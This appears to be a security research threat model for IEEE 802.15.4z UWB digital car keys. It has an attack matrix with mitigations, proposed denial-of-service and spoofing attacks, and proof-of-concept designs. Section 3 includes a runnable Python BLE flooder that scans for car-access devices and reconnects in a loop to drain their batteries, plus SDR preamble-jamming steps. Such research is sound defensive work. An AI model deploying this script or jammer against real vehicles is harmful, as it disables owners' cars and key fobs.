# Attack Vectors & Proof of Concepts (IEEE 802.15.4z)

This document outlines the attack surface of the Secure UWB stack, ranging from Physical Layer (PHY) manipulation to Protocol/Application Layer logic exploits.

## 1. The Threat Matrix

| Attack Name                            | Layer    | Target          | Mechanism (The "How")                                                                                                                                 | Feasibility                              | Mitigation                                                                                         |
| :------------------------------------- | :------- | :-------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------- | :--------------------------------------- | :------------------------------------------------------------------------------------------------- |
| **Ghost Peak (Cicada)**                | PHY      | LDE Algorithm   | Inject random/known pulses *before* the real signal to trigger the Leading Edge Detection early.                                                      | **High** (Legacy)<br>**Low** (802.15.4z) | **STS** (Scrambled Timestamp Sequence) makes the pulse unpredictable.                              |
| **Preamble Injection**                 | PHY      | AGC / Sync      | Blast a fake Sync Header (SHR) at high power. The receiver locks onto this and adjusts its gain (AGC) down, making it "deaf" to the real STS.         | **Medium**                               | Randomized Preambles (rare) or strict SFD (Start Frame Delimiter) checks.                          |
| **ED/LC (Early Detect / Late Commit)** | PHY      | Distance Calc   | **ED:** Attacker detects the pulse early (predicts it).<br>**LC:** Attacker transmits a replica instantly. Used to shorten distance in Relay attacks. | **Extremely Low**                        | STS prevents "Predicting" the pulse. Speed of light makes "Reacting" too slow to shorten distance. |
| **Distance Enlargement**               | PHY      | LDE             | Jam the First Path (LoS) so the receiver locks onto a reflection (NLoS). Makes the car think you are *further* away.                                  | **Medium**                               | Hard to use for theft (needs *closer*), but good for Denial of Service.                            |
| **Denial of Sleep (Battery Drain)**    | App/BLE  | Power Mgmt      | Spam BLE "Wake Up" or "Handshake" requests. Forces the target to power up the UWB radio repeatedly.                                                   | **High**                                 | Rate limiting, Back-off timers, ignoring repeated MACs.                                            |
| **Downgrade Attack**                   | Protocol | Capability Neg. | Jam or spoof the negotiation to force the system to use Legacy UWB (no STS) or fallback to BLE RSSI.                                                  | **Medium**                               | Policy: "Never unlock without STS."                                                                |

---

## 2. Proposed Novel/Hybrid Attacks

### A. The "Vampire" Attack (Denial of Sleep)
**Concept:** As you suggested, this exploits the **Handover** logic.
-   **Vulnerability:** The UWB chip consumes ~100x more power than the BLE chip. The system relies on BLE to "gatekeep."
-   **Attack:** An attacker mimics a valid User Phone's BLE Advertisement.
-   **Logic:**
    1.  Attacker broadcasts `BLE_ADV_IND` with the Car's Service UUID.
    2.  Car wakes up, initiates connection.
    3.  Attacker stalls the handshake or completes it (if they have a cloned public key, or if the car powers UWB *before* full auth for speed).
    4.  Car turns on UWB Radar.
    5.  Attacker disconnects.
    6.  Repeat every 200ms.
-   **Impact:** Drains the car's 12V battery or the Key Fob's coin cell (CR2032) in days instead of years.

### B. The "Mix-and-Match" Preamble Attack
**Concept:** Attack the transition between SYNC (insecure) and STS (secure).
-   **Vulnerability:** The receiver uses the SYNC field to set its **Automatic Gain Control (AGC)**.
-   **Attack:**
    1.  Attacker sends a valid SYNC header but at **Maximum Power**.
    2.  Receiver sets AGC to "Low Sensitivity" (expecting a loud signal).
    3.  Attacker stops transmitting just as the STS begins.
    4.  The Real Signal (STS) arrives at normal power.
    5.  **Result:** The Receiver is now "deaf" (gain too low) and misses the real STS. Packet Loss = Denial of Service.

### C. Industrial/IoT Vector: The "Phantom Worker" (TDoA Spoofing)
**Context:** Industrial environments (FiRa 4.0) use **Uplink-TDoA** to track thousands of asset tags. Tags blink; Anchors listen.
-   **Vulnerability:** TDoA relies on the *difference* in arrival time at multiple anchors.
-   **Attack:** An attacker places a simple repeater (delay line) near one specific anchor.
-   **Logic:**
    1.  The legitimate tag transmits a blink.
    2.  The attacker's device captures and re-transmits the signal to *one* anchor with a nanosecond delay.
    3.  The central solver calculates a position based on this delayed timestamp.
    4.  **Result:** The asset's location "teleports" on the dashboard, triggering safety stops or routing errors in automated factories.

---

## 3. Proof of Concept (POC) Design

### POC 1: The Battery Drainer (BLE Flooder)
**Objective:** Measure power consumption spike on a target device during BLE spam.

**Hardware Requirements:**
-   **Attacker:** ESP32 or nRF52840 Dongle (Approx $10).
-   **Target:** UWB Dev Kit (e.g., Qorvo, NXP, or Apple U1 via iPhone).
-   **Measurement:** Norduino Power Profiler Kit (PPK2) or a simple Multimeter.

**Software Logic (Attacker - Python with `bleak`):**
```python
import asyncio
from bleak import BleakScanner, BleakClient

# Target Service UUID (e.g., Digital Key Framework)
TARGET_SERVICE_UUID = "0000xxxx-0000-1000-8000-00805f9b34fb"

async def vampire_attack():
    print("Scanning for targets...")
    devices = await BleakScanner.discover()
    
    for d in devices:
        # Check if device advertises the car access service
        if TARGET_SERVICE_UUID in d.metadata.get("uuids", []):
            print(f"Target Found: {d.address} - Initiating Drain")
            
            while True:
                try:
                    # 1. Connect (Triggers Wake-up)
                    async with BleakClient(d.address) as client:
                        print(f"Connected to {d.address}. Waking UWB...")
                        # 2. Hold connection briefly to force UWB warm-up
                        await asyncio.sleep(0.2) 
                        # 3. Disconnect (Client exit triggers disconnect)
                        print("Disconnecting...")
                except Exception as e:
                    print(f"Cycle failed, retrying: {e}")
                
                # 4. Repeat immediately (Denial of Sleep)
                await asyncio.sleep(0.05)

if __name__ == "__main__":
    asyncio.run(vampire_attack())
```

**Success Criteria:**
-   Baseline Current: ~10 $\mu$A (Sleep).
-   Attack Current: > 50 mA (UWB Active).
-   Sustained Attack = Dead Battery.

---

### POC 2: The Preamble Injection (Jammer)
**Objective:** Prevent unlocking by manipulating the Receiver's AGC.

**Hardware Requirements:**
-   **Attacker:** HackRF One or any SDR (Software Defined Radio).
-   **Target:** Two UWB Kits performing ranging.

**Software Logic (GNU Radio):**
1.  **Sniff:** Detect the start of a UWB Frame (Look for the periodic Preamble codes).
2.  **Jam:** Immediately blast the same Preamble code at +10dB louder than the legitimate signal.
3.  **Stop:** Cease transmission exactly when the SFD (Start Frame Delimiter) is expected.

**Success Criteria:**
-   The Receiver logs "Preamble Detected" but fails "STS Verification" or "Timeout" because it couldn't hear the secure part.
-   Effective Range: Denial of Service for legitimate owner.

---

## 4. Feasibility Summary
-   **Battery Drain:** **Easiest.** Requires very cheap hardware (ESP32). Hard to defend against without ruining the user experience (latency).
-   **Ghost Peak (Legacy):** **Easy** with SDR, but ineffective against modern STS cars.
-   **Ghost Peak (Against STS):** **Nearly Impossible.** Requires breaking AES-128 in real-time ($< 1$ ns).
-   **Preamble Injection:** **Moderate.** Requires precise timing (microsecond level), but feasible with an FPGA or decent SDR.
